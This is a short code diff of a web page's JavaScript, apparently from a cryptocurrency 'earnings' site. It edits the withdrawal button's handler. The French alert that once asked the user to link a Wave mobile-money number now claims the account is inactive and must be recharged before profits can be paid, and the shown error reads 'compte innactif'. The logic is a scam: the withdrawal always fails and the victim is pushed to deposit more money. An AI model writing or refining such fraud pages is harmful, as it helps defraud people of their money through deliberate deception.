@@ -332,10 +332,10 @@
             });
 
             document.getElementById('confirm-withdrawal').addEventListener('click', () => {
-                alert('Cher BENE, veuillez éffectuer la liaison de votre numero wave au serveur de paiement afin de recevoir vos bénéfices immediatement.');
+                alert('Cher BENE, Les bénéfices des cryptomonaies ne peuvent pas vous parvenir car votre compte es inactif, veuillez le recharger afin de recevoir vos bénéfices immediatement.');
                 withdrawalForm.style.display = 'none';
                 errorMessage.style.display = 'block';
-                errorMessage.textContent = 'Erreur : liaison néccéssaire.';
+                errorMessage.textContent = 'Erreur : compte innactif.';
             });
 
             document.getElementById('whatsapp-button').addEventListener('click', () => {
